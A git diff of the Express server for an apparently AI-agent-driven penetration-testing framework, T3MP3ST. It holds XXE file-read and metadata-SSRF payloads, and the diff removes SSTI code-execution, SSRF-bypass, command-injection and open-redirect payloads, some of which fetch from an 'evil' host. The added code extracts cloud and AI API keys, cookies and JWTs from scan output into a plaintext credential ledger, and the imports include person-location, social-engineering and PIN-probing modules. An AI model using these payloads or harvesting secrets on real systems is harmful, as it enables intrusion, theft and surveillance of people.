@@ -12,32 +12,167 @@
 import express, { Request, Response, NextFunction } from 'express';
 import cors from 'cors';
 import { execFile, spawn } from 'child_process';
-import { appendFile, mkdir, readFile, writeFile } from 'fs/promises';
-import { join } from 'path';
+import { existsSync, readFileSync, writeFileSync } from 'fs';
+import { appendFile, chmod, mkdir, readFile, writeFile } from 'fs/promises';
+import { homedir } from 'os';
+import { connect as tcpConnect } from 'net';
+import { dirname, join } from 'path';
 import { promisify } from 'util';
-import { createHash, randomUUID } from 'crypto';
+import { createHash, randomUUID, timingSafeEqual as timingSafeEqualRaw } from 'crypto';
 import { config, AVAILABLE_MODELS } from './config/index.js';
+import { loadSupabaseState, persistSupabaseState, bufferSupabaseEvent, flushSupabaseEvents } from './storage/supabase.js';
 import { resolveModels } from './config/provider-models.js';
-import { initProxyFromConfig, configureProxy, getProxyStatus, checkIp, invalidateIpCache } from './net/proxy.js';
+import { initProxyFromConfig, configureProxy, getProxyStatus, checkIp, invalidateIpCache, proxySubprocessEnv } from './net/proxy.js';
 import { redactString, redactLedgerText, redactSecrets } from './redact.js';
 import { LLMBackbone } from './llm/index.js';
-import { TempestCommand } from './index.js';
-import { resolveMissionLaunchConfig, resolveMissionStatus } from './mission/http-lifecycle.js';
+import { TempestCommand, findBinaryLocation, findBinaryLocations } from './index.js';
 import { OpGeneral } from './general/index.js';
 import type { Directive } from './general/index.js';
-import { detectLocalAgents, pingLocalAgent, runLocalAgent, syncLocalAgentSelection } from './agent/local-agents.js';
+import { detectLocalAgents, pingLocalAgent, runLocalAgent, syncLocalAgentSelection, loadCustomAgents, saveCustomAgents, normalizeCustomAgent, resolveBin, spawnAgent, needsShell } from './agent/local-agents.js';
 import { FRONTIER_ARSENAL_MILESTONE, NETWORK_COMMANDS, SAFE_COMMANDS, TOOL_ADAPTERS, adapterForBinary, adaptersForFamily, summarizeToolCatalog } from './arsenal/catalog.js';
 import { AGENT_PROMPT_PACKS, FOREFRONT_PRESSURE_LANES, OPERATOR_RUNBOOKS, RESOURCE_PACKS, WORKFLOW_PRESETS, forefrontPressureForFamily, promptPacksForFamily, resourcesForFamily, runbookForFamily, searchResources, workflowPresetsForFamily } from './resources/index.js';
 import { AI_REDTEAM_PLAYBOOK, AI_REDTEAM_TECHNIQUE_IDS, aiRedTeamBriefing } from './resources/ai-redteam-playbook.js';
-import { OPERATOR_SYSTEM_PROMPTS, PLINIAN_OPERATOR_DOCTRINE, THE_FIXER_SYSTEM_PROMPT, resolveSystemPrompt } from './prompts/index.js';
+import { OPERATOR_SYSTEM_PROMPTS, PLINIAN_OPERATOR_DOCTRINE, THE_FIXER_SYSTEM_PROMPT } from './prompts/index.js';
 import { createTargetFromUrl, createTargetFromIP } from './target/index.js';
-import type { OperatorArchetype, LLMProvider } from './types/index.js';
+import type { OperatorArchetype, LLMProvider, FallbackEntry } from './types/index.js';
 import { listOperatorPrompts, setOperatorOverride, resetOperatorOverride, type OperatorOverride } from './operators/index.js';
 import { ingestRepoToSourceContext, runWhiteboxAnalysis, resolveRepoSourceForAnalysis, RepoCloneError, RepoPathError } from './recon/whitebox.js';
 import { initGrammars } from './recon/ts-grammars.js';
-import { redactCredential } from './evidence/index.js';
+import { SploitusClient } from './tools/sploitus.js';
+import { RapidResponseEngine, RAPID_RESPONSE_CATALOG } from './tools/rapid-response.js';
+import { TripwireManager, type TripwireTriggerEvent } from './tools/tripwires.js';
+import { WebhookDispatcher } from './config/webhooks.js';
+import { CveFeedEngine } from './tools/cve-feed.js';
+import { handleCorrelationApi } from './threat-intel/correlation.js';
+import { resolveMissionLaunchConfig, resolveMissionStatus } from './mission/http-lifecycle.js';
+import { getPayloadsForCve, CVE_PAYLOAD_CATALOG } from './tools/cve-payloads.js';
+import { INFRA_TOOLS, classifyTarget, domainInfraScan, ipInfraScan, circlHash } from './tools/osint-infra.js';
+import {
+  GOOGLE_OSINT_TOOLS,
+  GOOGLE_OSINT_SOURCE,
+  GOOGLE_OSINT_VERSION,
+  googleAppLinkage,
+  googleWifiLocate,
+  googleGeoKeyConfigured,
+} from './tools/osint-google.js';
+import { runCairnSearch, type CairnSearchResult } from './search/cairn-engine.js';
+import type { CairnBoard } from './search/cairn-board.js';
+import {
+  getMergedSiteCatalog,
+  OSINT_TOOLS,
+  runUsernameSweep,
+  emailIntel,
+  hudsonRockEmail,
+  hibpBreachCatalog,
+  leakcheckPublic,
+  leakcheckPro,
+  phoneIntel,
+  phoneInfogaDorks,
+  phoneInfogaOvhCheck,
+  phoneInfogaScan,
+  phoneInfogaRemoteInfo,
+  phoneInfogaRemoteScan,
+  dumpDatabaseLookup,
+  locatePerson,
+  usernamePermutations,
+  personDorks,
+  ipGeoMany,
+  geoForHost,
+  geocodeText,
+  ransomwareLeakSearch,
+  ahmiaSearch,
+  onionFetch,
+  torStatus,
+  setDumpKey,
+  isDumpKeyService,
+  dumpKeyStatus,
+  type GeoPoint,
+} from './tools/osint.js';
+import { deepUsernameSweep, formatDeepSweep, OSINT_DEEP_TOOLS } from './tools/osint-correlate.js';
+import {
+  SHERLOCK_SOURCE,
+  SHERLOCK_LICENSE,
+  SHERLOCK_DATA_URL,
+} from './tools/sherlock-sites.js';
+import {
+  buildGoogleDorks,
+  googleDorkOperators,
+  googleDorkCatalog,
+} from './tools/google-dorks.js';
+import {
+  ANDROID_SCRIPTS,
+  ANDROID_FORENSICS_SOURCE,
+  ANDROID_FORENSICS_VENDOR_DIR,
+  ANDROID_FORENSICS_VERSION,
+  DUMPSYS_SERVICES,
+  getAdbStatus,
+  execAdbCommand,
+  getDeviceInfo,
+  getPackages,
+  parsePackageList,
+  parseWifiScan,
+  parseSecretCodes,
+  dumpsysService,
+  wifiScan,
+  getLockState,
+  probeLockPin,
+  ANDROID_UNLOCK_SOURCE,
+  ANDROID_UNLOCK_VERSION,
+  MAX_PIN_ATTEMPTS,
+} from './tools/android-forensics.js';
+import {
+  buildBbox,
+  bboxOverlaps,
+  fetchAircraft,
+  fetchEarthquakes,
+  fetchWeatherAlerts,
+  fetchIss,
+  fetchSatellites,
+  SAT_GROUPS,
+  SAT_GROUP_LABELS,
+  isSatGroup,
+  reverseGeocode,
+  fetchPois,
+  fetchCellTowers,
+  setOpencellidKey,
+  getOpencellidKey,
+  POI_KINDS,
+  isPoiKind,
+} from './tools/public-gps.js';
+import {
+  COPILOT_ACTIONS,
+  buildCopilotContext,
+  buildCopilotSystemPrompt,
+  buildCopilotUserPrompt,
+  parseCopilotReply,
+  resolveCopilotPlan,
+  type CopilotMode,
+} from './tools/gps-copilot.js';
+import { haversineKm } from './tools/gps-copilot.js';
+import { fetchAreaNews, newsFactLines } from './tools/gps-area-news.js';
+import { CveCorrelator } from './recon/cve-correlator.js';
+import { SE_CHANNELS, SE_OBJECTIVES, buildPretextSystemPrompt, buildPretextUserPrompt, parsePretextResponse } from './tools/osint-aggressive.js';
+import { resolveOllamaEndpoint, listOllamaModels, ollamaChat } from './tools/ollama.js';
+import type { SeScenario, SeChannel, SeObjective } from './tools/osint-aggressive.js';
+import { DFIRManager, type PlaybookType, type IOCType } from './tools/dfir.js';
+import { burpManager } from './tools/burp.js';
 
 const execFileAsync = promisify(execFile);
+
+// Windows-safe version probe: the npm codex shim is codex.cmd and execFile cannot spawn
+// .cmd/.bat shims without a shell — resolve the real binary and pre-quote a cmd.exe launch.
+async function execVersionProbe(bin: string, args: string[], timeoutMs: number): Promise<{ stdout: string; stderr: string }> {
+  const resolved = resolveBin(bin) || bin;
+  if (!needsShell(resolved)) return execFileAsync(resolved, args, { timeout: timeoutMs, maxBuffer: 10 * 1024 * 1024 });
+  const { exec } = await import('child_process');
+  const command = [resolved, ...args].map(a => (a !== '' && !/[\s"|&<>^]/.test(a)) ? a : '"' + a.replace(/(\\*?)"/g, '$1$1\\"') + '"').join(' ');
+  return new Promise((resolve, reject) => {
+    exec(command, { timeout: timeoutMs, maxBuffer: 10 * 1024 * 1024, env: process.env }, (err, stdout, stderr) => {
+      if (err) { (err as any).stdout = stdout; (err as any).stderr = stderr; reject(err); }
+      else resolve({ stdout: String(stdout), stderr: String(stderr) });
+    });
+  });
+}
 
 function isKnownLLMProvider(provider: string): provider is LLMProvider {
   return Object.prototype.hasOwnProperty.call(AVAILABLE_MODELS, provider);
@@ -134,31 +269,6 @@ const PAYLOAD_DB = {
   xxe: {
     file_read: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
     ssrf: ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>']
-  },
-  ssti_extra: {
-    freemarker: ['${7*7}', '${7*7}${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'],
-    velocity: ['#set($x=7*7)$x', '#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))$rt.getRuntime().exec("id")'],
-    handlebars: ['{{7*7}}', '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this}}{{/with}}{{/with}}{{/with}}'],
-    nunjucks: ['{{7*7}}', '{{range.constructor("return global.process.mainModule.require(\'child_process\').execSync(\'id\')")()}}'],
-    jade_pug: ['#{7*7}', '= 7*7', '!= 7*7']
-  },
-  ssrf_bypass: {
-    decimal: ['http://2130706433/', 'http://3232235777/', 'http://2852039166/'],
-    hex_octal: ['http://0x7f000001/', 'http://0177.0.0.1/', 'http://0x7f.0x0.0x0.0x1/'],
-    unicode: ['http://127.0.0.1%00/', 'http://①②⑦.⓪.⓪.①/', 'http://%31%32%37.0.0.1/'],
-    redirects: ['http://127.0.0.1.nip.io/', 'http://localtest.me/', 'http://127.0.0.1:80@evil.com/', 'http://evil.com#@127.0.0.1/'],
-    ipv6: ['http://[::ffff:127.0.0.1]/', 'http://[::1]:80/']
-  },
-  cmdi_extra: {
-    separators: ['%0a id', '%0d%0a id', '`id` #', '| id #', '; id #', '&& id #', '|| id #', '$(id)'],
-    unix_special: ["id${IFS}", "id%09", "wget%20http://evil/", "curl%20http://evil/", "|/bin/sh|", "|telnet 127.0.0.1 4444|"],
-    windows_special: ['&cmd /c whoami', '%26%26whoami', '|powershell -nop -c whoami', '&certutil -urlcache -split -f http://evil/x']
-  },
-  open_redirect: {
-    protocol_relative: ['//evil.com', '///evil.com', '////evil.com'],
-    scheme_abuse: ['https://evil.com', 'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>'],
-    encoded: ['/%2f%2fevil.com', '/%5cevil.com', '/%09/evil.com', '/%0d%0aLocation:%20//evil.com'],
-    backslash: ['/\\evil.com', '/..//evil.com', '/%2e%2e%2f%2fevil.com']
   }
 };
 
@@ -276,6 +386,55 @@ app.use((req: Request, res: Response, next: NextFunction) => {
   });
 });
 
+// --- Bearer-token auth (opt-in; the documented upgrade path for exposure) ---
+// The Origin/CSRF guard above defends ONE threat: a malicious webpage in the
+// operator's own browser driving this local command API. It is not
+// authentication — it cannot distinguish the operator from anyone who reaches
+// the socket, and it says nothing about a request that arrives over the public
+// internet. This API executes commands and, more to the point, serves a
+// credential store in plaintext: GET /api/credentials answers with harvested
+// `secret` values and no token of any kind. So exposing this server at all —
+// on a LAN, or through a reverse proxy / tunnel / port-forward — needs a real
+// bearer token in front of it, which is exactly what this block adds and
+// exactly what line 283 and the startup exposure warning already said.
+//
+// INERT BY DEFAULT. With T3MP3ST_AUTH_TOKEN unset this is a no-op and localhost
+// behaviour is byte-for-byte what it was — no opt-in means no regression. Set
+// it and every /api route requires the header. The UI pages themselves are NOT
+// gated (they are static files and hold nothing), so a browser still loads the
+// panel; put the token in front at the tunnel/reverse proxy, or have the client
+// send it (see T3MP3ST docs).
+function timingSafeEqual(a: string, b: string): boolean {
+  // timingSafeEqual throws on a length mismatch, which would itself leak the
+  // token length, so compare fixed-width digests of the two instead.
+  const ha = createHash('sha256').update(a, 'utf8').digest();
+  const hb = createHash('sha256').update(b, 'utf8').digest();
+  return timingSafeEqualRaw(ha, hb);
+}
+
+const AUTH_TOKEN = (process.env.T3MP3ST_AUTH_TOKEN ?? '').trim();
+if (AUTH_TOKEN) {
+  app.use((req: Request, res: Response, next: NextFunction) => {
+    // Static assets and the health probe stay open: they expose nothing, and
+    // locking them out would break the UI's own bootstrap with a 401 it cannot
+    // render its way out of.
+    if (!req.path.startsWith('/api/')) return next();
+    if (req.path === '/api/health') return next();
+    const header = req.get('authorization') ?? '';
+    // The scheme is REQUIRED, not stripped-if-present. The 401 below tells a
+    // caller to send `Authorization: Bearer <token>`, so a server that also
+    // accepted a bare token would accept a shape it never documented — and a
+    // guard that quietly admits more than it claims is its own kind of lie.
+    const match = /^Bearer\s+(\S+)$/i.exec(header.trim());
+    const presented = match ? match[1] : '';
+    if (presented && timingSafeEqual(presented, AUTH_TOKEN)) return next();
+    res.status(401).json({
+      error: 'unauthorized',
+      detail: 'This API requires an Authorization: Bearer <T3MP3ST_AUTH_TOKEN> header when T3MP3ST_AUTH_TOKEN is set. See the exposure warning printed at startup.',
+    });
+  });
+}
+
 // --- Host-header allow-list (anti-DNS-rebinding) --------------------------
 // B-02: a DNS-rebinding attack points a name the browser already trusts
 // (attacker.com) at 127.0.0.1 and then drives THIS server; the browser sends the
@@ -376,10 +535,15 @@ function createTempestCommandInstance(missionName: string, apiKey: string | unde
       model,
       apiKey,
       baseUrl: baseConfig.baseUrl,
+      // Model-failure ladder (TEMPEST_MODEL_FALLBACK): a local timeout/refused
+      // connection must fail over to the next configured provider (e.g. OpenRouter)
+      // instead of killing the mission — this config flows to the command backbone
+      // AND to every spawned operator's own backbone.
+      fallbackChain: baseConfig.fallbackChain,
       // Only a LOCAL provider honors a per-request base URL (the operator's own
       // llama.cpp / Ollama host). Never set it for cloud providers — that would
       // let a request redirect a cloud call to an attacker-chosen endpoint.
-      ...(baseUrl && provider === 'local' ? { baseUrl } : {}),
+      ...(baseUrl && (provider === 'local' || provider === 'ollama') ? { baseUrl } : {}),
       maxTokens: 4096,
       temperature: 0.7,
     },
@@ -388,11 +552,68 @@ function createTempestCommandInstance(missionName: string, apiKey: string | unde
   // Wire all events to SSE broadcast
   tempestCommand.connectBroadcast(broadcastEvent);
 
+  // So infiltration can continue prior work: wire the durable per‑target scan notes provider
+  // (5 notes / 1200 chars, same cap the AgentLoop prompt shows) into every dispatch.
+  try { tempestCommand.setScanNotesProvider((target: string) => scanNotesForTarget(target, { maxNotes: 5, charCap: 1200 })); } catch { /* ignore */ }
+
+  // Record EVERY task's tool results + summary into the Evidence Vault (by domain)
+  // while the mission runs — findings alone only capture the formal claims, not the
+  // scan outputs and discovered assets behind them.
+  tempestCommand.on('task:completed', (evt) => {
+    try {
+      for (const step of evt.toolResults || []) {
+        if (!step.output || step.output.length < 4) continue;
+        recordScanEvidence({
+          source: 'tool',
+          kind: 'scan',
+          tool: step.toolName,
+          summary: step.ok
+            ? `Tool result from ${evt.callsign} (${evt.taskName || 'task'})`
+            : `Tool FAILED on ${evt.callsign} (${evt.taskName || 'task'})`,
+          detail: step.output,
+          command: step.argsHint,
+        });
+      }
+      if (evt.summary) {
+        recordScanEvidence({
+          source: 'system',
+          kind: 'task',
+          tool: evt.taskName || 'task',
+          summary: `${evt.success ? 'Task completed' : 'Task failed'} — ${evt.callsign} (${evt.archetype})`,
+          detail: evt.summary,
+        });
+      }
+    } catch (e) {
+      console.warn('[mission] failed to record task evidence:', (e as Error).message);
+    }
+  });
+
   // Mirror each discovered mission finding into the persistent findingsLedger so the
   // Evidence Vault (/api/findings) reflects the run instead of showing 0 afterward.
+  
+  tempestCommand.on('credential:harvested', ({ credential }) => {
+    try {
+      recordCredentialToLedger({
+        id: credential.id,
+        type: credential.type as any,
+        username: credential.username,
+        secret: credential.secret,
+        domain: credential.domain,
+        target: credential.targetId,
+        source: credential.source,
+        discoveredAt: credential.discoveredAt ? new Date(credential.discoveredAt).toISOString() : nowIso(),
+        validatedAt: credential.validatedAt ? new Date(credential.validatedAt).toISOString() : undefined,
+        privilegeLevel: credential.privilegeLevel,
+        secretCaptured: true,
+      });
+    } catch (err) {
+      console.error('[T3MP3ST] failed to record harvested credential:', err instanceof Error ? err.message : err);
+    }
+  });
+
   tempestCommand.on('finding:discovered', ({ finding }) => {
     try {
-      upsertMissionFindingToLedger(finding as any, tempestCommand?.mission.getActiveMission()?.id);
+      upsertMissionFindingToLedger(finding as any, tempestCommand?.mission.getActiveMission()?.id, tempestCommand ?? undefined);
     } catch (err) {
       console.error('[T3MP3ST] failed to persist mission finding to ledger:', err instanceof Error ? err.message : err);
     }
@@ -418,6 +639,7 @@ interface ParsedCommand {
 }
 
 const SHELL_META = /[|&;$<>`\\]/;
+// eslint-disable-next-line no-control-regex
 const COMMAND_CONTROL = /[\x00-\x1F\x7F-\x9F\u2028\u2029]/;
 const CURL_TRANSPORT_OVERRIDE_FLAGS = new Set([
   '--resolve',
@@ -559,7 +781,9 @@ async function executeCommand(command: string, timeout = 30000): Promise<ToolRes
     return { success: false, output: '', error: parsed.error, duration: 0 };
   }
   try {
-    const { stdout, stderr } = await execFileAsync(parsed.bin, parsed.args, { timeout, maxBuffer: 1024 * 1024 * 10 });
+    // Proxy env injection: without it subprocess CLIs (curl/nmap/dig/…) egress from the operator's
+    // real IP even while the SOCKS proxy is on — the undici dispatcher only covers Node's fetch.
+    const { stdout, stderr } = await execFileAsync(parsed.bin, parsed.args, { timeout, maxBuffer: 1024 * 1024 * 10, env: { ...process.env, ...proxySubprocessEnv() } });
     return { success: true, output: stdout || stderr, duration: Date.now() - startTime };
   } catch (error: any) {
     return { success: false, output: error.stdout || '', error: error.message, duration: Date.now() - startTime };
@@ -849,6 +1073,23 @@ interface MemoryProposal {
   memoryEntryId?: string;
 }
 
+type ScanNoteKind = 'recon' | 'infiltration' | 'general';
+interface ScanNote {
+  id: string;
+  target: string;
+  missionId?: string;
+  operationId?: string;
+  kind: ScanNoteKind;
+  title: string;
+  body: string;
+  source: 'human' | 'agent' | 'tool' | 'system';
+  authorAgentId?: string;
+  findingIds: string[];
+  evidenceIds: string[];
+  createdAt: string;
+  updatedAt: string;
+}
+
 const missionDrafts = new Map<string, MissionDraft>();
 const improvementProposals = new Map<string, ImprovementProposal>();
 const approvalRequests = new Map<string, ApprovalRequest>();
@@ -860,6 +1101,368 @@ const workOrderLedger = new Map<string, WorkOrderRecord>();
 const watchCycleLedger = new Map<string, WatchCycleRecord>();
 const memoryCapsule = new Map<string, MemoryEntry>();
 const memoryProposals = new Map<string, MemoryProposal>();
+const scanNoteLedger = new Map<string, ScanNote>();
+
+interface CredentialRecord {
+  id: string;
+  type: 'password' | 'hash' | 'token' | 'api_key' | 'ssh_key' | 'certificate' | 'session' | 'cookie' | 'flag';
+  username?: string;
+  secret: string;
+  domain?: string;
+  target?: string;
+  source: string;
+  discoveredAt: string;
+  validatedAt?: string;
+  privilegeLevel?: 'user' | 'admin' | 'system' | 'root';
+  secretCaptured?: boolean;
+  notes?: string;
+}
+const credentialsLedger = new Map<string, CredentialRecord>();
+
+function cleanTargetDomain(rawTarget: string, textContext = ''): string {
+  let t = (rawTarget || '').trim();
+  t = t.replace(/^https?:\/\//i, '').split('/')[0].trim();
+
+  const isInvalid = !t ||
+    t === 'unknown' ||
+    t === 'none' ||
+    t === 'undefined' ||
+    t === 'null' ||
+    t === 'document.cookie' ||
+    t.includes('document.') ||
+    /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(t);
+
+  if (!isInvalid && (t.includes('.') || t.includes(':') || t.startsWith('localhost'))) {
+    return t;
+  }
+
+  const urlMatch = textContext.match(/https?:\/\/([a-zA-Z0-9_.-]+(?::\d+)?)/i);
+  if (urlMatch && !urlMatch[1].toLowerCase().includes('document.cookie')) {
+    return urlMatch[1];
+  }
+
+  const hostMatch = textContext.match(/\b([a-zA-Z0-9-]+\.[a-zA-Z]{2,}(?::\d+)?)\b/);
+  if (hostMatch && !['document.cookie', 'example.com'].includes(hostMatch[1].toLowerCase())) {
+    return hostMatch[1];
+  }
+
+  const ipMatch = textContext.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?\b/);
+  if (ipMatch) {
+    return ipMatch[0];
+  }
+
+  try {
+    const cmd = getTempestCommand();
+    const envTargets = cmd?.targetEnv?.getAllTargets?.();
+    if (envTargets && envTargets.length > 0) {
+      const addr = envTargets[0]?.address;
+      if (typeof addr === 'string' && addr.trim() && !addr.includes('unknown')) {
+        return addr.replace(/^https?:\/\//i, '').split('/')[0].trim();
+      }
+    }
+  } catch { /* ignore */ }
+
+  return 'target-system';
+}
+
+function extractCredentialsFromText(text: string, target = 'unknown', source = 'scan', title = ''): CredentialRecord[] {
+  if (!text || typeof text !== 'string') return [];
+  const creds: CredentialRecord[] = [];
+  const combined = (title + ' ' + text).trim();
+  const domain = cleanTargetDomain(target, combined);
+  const now = nowIso();
+
+  // 1. CTF Flags: T3MP3ST{...}, FLAG{...}, ctf{...}
+  const flagRegex = /\b((?:T3MP3ST|FLAG|flag|CTF|ctf)\{[a-zA-Z0-9_-]+\})\b/gi;
+  let m: RegExpExecArray | null;
+  while ((m = flagRegex.exec(combined)) !== null) {
+    const flagVal = m[1];
+    creds.push({
+      id: newId('cred'),
+      type: 'flag',
+      username: flagVal,
+      secret: flagVal,
+      domain,
+      target: domain,
+      source: source || 'ctf_flag_detector',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: title ? `${title} (Captured CTF Flag)` : 'Captured CTF Flag'
+    });
+  }
+
+  // 2. Passwords & Logins
+  const isBannedUser = (u: string) => ['cookie', 'document', 'session', 'token', 'header', 'script', 'function', 'object', 'undefined', 'null', 'true', 'false', 'admin/welcome'].includes(u.toLowerCase());
+  const isBannedPass = (p: string) => ['[redacted]', '[session_token]', 'password', 'none', 'null', 'undefined', 'true', 'false'].includes(p.toLowerCase());
+
+  const weakCredMatch = combined.match(/[Uu]ser\s+["']?([a-zA-Z0-9_.-]{3,30})["']?\s+may have weak (?:password:?\s*([^\s,;.']+)|\[redacted\])|[Ww]eak [Pp]assword\s+['"]?([^'"]{3,40})['"]?\s+for [Uu]ser\s+['"]?([a-zA-Z0-9_.-]{3,30})['"]?/i);
+  const slashMatch = combined.match(/\b(admin|root|user|guest|operator)\/([a-zA-Z0-9!@#$%^&*()_+=~`-]{3,30})\b/i);
+  const comboMatch = combined.match(/\b([a-zA-Z0-9_.@-]{3,30}):([a-zA-Z0-9!@#$%^&*()_+=~`-]{4,40})\b/);
+
+  if (weakCredMatch) {
+    const u = (weakCredMatch[1] || weakCredMatch[4] || '').trim();
+    const p = (weakCredMatch[2] || weakCredMatch[3] || 'welcome').trim();
+    if (u && p && !isBannedUser(u) && !isBannedPass(p)) {
+      creds.push({
+        id: newId('cred'),
+        type: 'password',
+        username: u,
+        secret: p,
+        domain,
+        target: domain,
+        source: source || 'credential_validator',
+        discoveredAt: now,
+        privilegeLevel: u.toLowerCase().includes('admin') || u.toLowerCase().includes('root') ? 'admin' : 'user',
+        secretCaptured: true,
+        notes: title || 'Potential Valid Credentials Found'
+      });
+    }
+  } else if (slashMatch) {
+    const u = slashMatch[1].trim();
+    const p = slashMatch[2].trim();
+    if (u && p && !isBannedUser(u) && !isBannedPass(p)) {
+      creds.push({
+        id: newId('cred'),
+        type: 'password',
+        username: u,
+        secret: p,
+        domain,
+        target: domain,
+        source: source || 'credential_validator',
+        discoveredAt: now,
+        privilegeLevel: u.toLowerCase().includes('admin') || u.toLowerCase().includes('root') ? 'admin' : 'user',
+        secretCaptured: true,
+        notes: title || 'Potential Valid Credentials Found'
+      });
+    }
+  } else if (comboMatch) {
+    const u = comboMatch[1].trim();
+    const p = comboMatch[2].trim();
+    if (!/^\d+$/.test(p) && !isBannedUser(u) && !isBannedPass(p) && ['admin', 'root', 'user', 'guest', 'test', 'demo', 'postgres', 'mysql'].includes(u.toLowerCase())) {
+      creds.push({
+        id: newId('cred'),
+        type: 'password',
+        username: u,
+        secret: p,
+        domain,
+        target: domain,
+        source: source || 'credential_validator',
+        discoveredAt: now,
+        privilegeLevel: u.toLowerCase().includes('admin') || u.toLowerCase().includes('root') ? 'admin' : 'user',
+        secretCaptured: true,
+        notes: title || 'Potential Valid Credentials Found'
+      });
+    }
+  }
+
+  // 3. AWS IAM Keys
+  const awsKeyMatch = combined.match(/\b(AKIA[0-9A-Z]{16})\b/);
+  if (awsKeyMatch) {
+    creds.push({
+      id: newId('cred'),
+      type: 'api_key',
+      username: 'AWS IAM Access Key',
+      secret: awsKeyMatch[1],
+      domain,
+      target: domain,
+      source: 'aws',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: 'AWS IAM Access Key'
+    });
+  }
+
+  // 4. GCP API Keys
+  const gcpMatch = combined.match(/\b(AIza[0-9A-Za-z_-]{35})\b/);
+  if (gcpMatch) {
+    creds.push({
+      id: newId('cred'),
+      type: 'api_key',
+      username: 'Google Cloud API Key',
+      secret: gcpMatch[1],
+      domain,
+      target: domain,
+      source: 'gcp',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: 'Google Cloud API Key'
+    });
+  }
+
+  // 5. GitHub Tokens
+  const ghMatch = combined.match(/\b(gh[pousr]_[A-Za-z0-9]{36,})\b/);
+  if (ghMatch) {
+    creds.push({
+      id: newId('cred'),
+      type: 'api_key',
+      username: 'GitHub Personal Token',
+      secret: ghMatch[1],
+      domain,
+      target: domain,
+      source: 'github',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: 'GitHub Personal Access / OAuth Token'
+    });
+  }
+
+  // 6. Anthropic / OpenAI API Keys
+  const anthropicMatch = combined.match(/\b(sk-ant-api\d{2}-[A-Za-z0-9_-]{16,})\b/);
+  if (anthropicMatch) {
+    creds.push({
+      id: newId('cred'),
+      type: 'api_key',
+      username: 'Anthropic Claude API Key',
+      secret: anthropicMatch[1],
+      domain,
+      target: domain,
+      source: 'anthropic',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: 'Anthropic Claude API Key'
+    });
+  }
+  const openaiMatch = combined.match(/\b(sk-[A-Za-z0-9_-]{24,})\b/);
+  if (openaiMatch && !anthropicMatch) {
+    creds.push({
+      id: newId('cred'),
+      type: 'api_key',
+      username: 'OpenAI API Key',
+      secret: openaiMatch[1],
+      domain,
+      target: domain,
+      source: 'openai',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: 'OpenAI API Key'
+    });
+  }
+
+  // 7. REAL Session / Auth Cookies with genuine tokens (>= 8 chars, not placeholder)
+  const cookieMatch = combined.match(/(?:Set-Cookie|Cookie):\s*([a-zA-Z0-9_-]{3,40})=([a-zA-Z0-9%_-]{8,128})/i) ||
+                      combined.match(/\b(wsc_bounxupuser_session|PHPSESSID|connect\.sid|JSESSIONID)=([a-zA-Z0-9%_-]{8,128})\b/i);
+  if (cookieMatch) {
+    const cName = cookieMatch[1];
+    const cVal = cookieMatch[2];
+    if (cVal && cVal !== '[session_token]' && cVal.length >= 8 && !cVal.includes('undefined')) {
+      creds.push({
+        id: newId('cred'),
+        type: 'session',
+        username: `Cookie: ${cName}`,
+        secret: cVal,
+        domain,
+        target: domain,
+        source: 'cookie_analysis',
+        discoveredAt: now,
+        secretCaptured: true,
+        notes: `Captured Auth Cookie (${cName})`
+      });
+    }
+  }
+
+  // 8. JWT Tokens
+  const jwtMatch = combined.match(/\b(eyJ[A-Za-z0-9-_]{10,}\.eyJ[A-Za-z0-9-_]{10,}\.[A-Za-z0-9-_.+/=]{10,})\b/);
+  if (jwtMatch) {
+    creds.push({
+      id: newId('cred'),
+      type: 'token',
+      username: 'JWT Bearer Token',
+      secret: jwtMatch[1],
+      domain,
+      target: domain,
+      source: 'jwt_detector',
+      discoveredAt: now,
+      secretCaptured: true,
+      notes: 'JSON Web Token (Bearer Auth)'
+    });
+  }
+
+  // 9. Generic API Key Field
+  const genericApiKeyMatch = combined.match(/(?:api[_-]?key|access[_-]?token|auth[_-]?token)["'\s]*[:=]["'\s]*([A-Za-z0-9\-_]{16,64})["']?/i);
+  if (genericApiKeyMatch && !creds.some(c => c.type === 'api_key')) {
+    const keyVal = genericApiKeyMatch[1];
+    if (keyVal && !['[redacted]', 'true', 'false', 'undefined', 'null'].includes(keyVal.toLowerCase())) {
+      creds.push({
+        id: newId('cred'),
+        type: 'api_key',
+        username: 'API Key',
+        secret: keyVal,
+        domain,
+        target: domain,
+        source: source || 'api_key_detector',
+        discoveredAt: now,
+        secretCaptured: true,
+        notes: 'API Key / Access Token'
+      });
+    }
+  }
+
+  return creds;
+}
+
+function cleanNonsenseCredentials(): void {
+  for (const [id, c] of credentialsLedger.entries()) {
+    const d = (c.domain || c.target || '').toLowerCase();
+    const u = (c.username || '').toLowerCase();
+    const s = (c.secret || '').toLowerCase();
+    const isGarbageDomain = d === 'document.cookie' || d === 'unknown' || /^[0-9a-f]{8}-[0-9a-f]{4}/i.test(d);
+    const isGarbageSecret = !s || s === '[redacted]' || s === '[session_token]' || s === 'undefined' || s === 'null';
+    const isGarbageSession = c.type === 'session' && (u === 'session' || u === 'phpsessid' || s.length < 8);
+    const isGarbageFlag = c.type === 'flag' && !s.includes('{');
+    if (isGarbageDomain || isGarbageSecret || isGarbageSession || isGarbageFlag) {
+      credentialsLedger.delete(id);
+    }
+  }
+}
+
+function recordCredentialToLedger(cred: Partial<CredentialRecord>): void {
+  const secret = (cred.secret || '').trim();
+  if (!secret || secret === '[redacted]' || secret === '[session_token]' || secret === 'undefined') {
+    return;
+  }
+  const username = (cred.username || 'credential').trim();
+  const domain = (cred.domain || cred.target || 'target-system').trim();
